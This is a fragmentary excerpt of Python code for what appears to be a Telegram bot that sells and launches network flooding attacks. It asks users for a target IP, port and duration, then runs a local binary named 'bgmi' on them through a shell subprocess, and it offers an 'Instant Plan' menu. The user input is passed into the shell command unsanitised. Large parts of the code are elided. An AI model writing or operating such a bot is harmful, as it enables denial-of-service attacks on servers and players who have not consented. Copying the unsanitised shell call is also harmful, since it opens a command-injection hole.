...
FORWARD_CHANNEL_ID = -GROUP ID
CHANNEL_ID = -GROUP ID
error_channel_id = -GROUP ID
...
async def run_attack_command_async(target_ip, target_port, duration):
    process = await asyncio.create_subprocess_shell(f"./bgmi {target_ip} {target_port} {duration} 400")
...
def attack_command(message):
    ...
    try:
        ...
        bot.send_message(chat_id, "Please provide <ip> <port> <time>.")
...
def attack_command(message):
    ...
    try:
        ...
        bot.send_message(chat_id, "*✅ Please provide <ip> <port> <time>*", parse_mode='Markdown')
        bot.register_next_step_handler(message, process_attack_command)
    except Exception as e:
        logging.error(f"Error in attack command: {e}")
...
def process_attack_command(message):
    try:
        ...
        if len(args) != 3:
            bot.send_message(message.chat.id, "*Try Again*", parse_mode='Markdown')
            return
...
def handle_message(message):
    if message.text == "Instant Plan 🧡":
        ...
        bot.reply_to(message, "*Loading...*", parse_mode='Markdown')
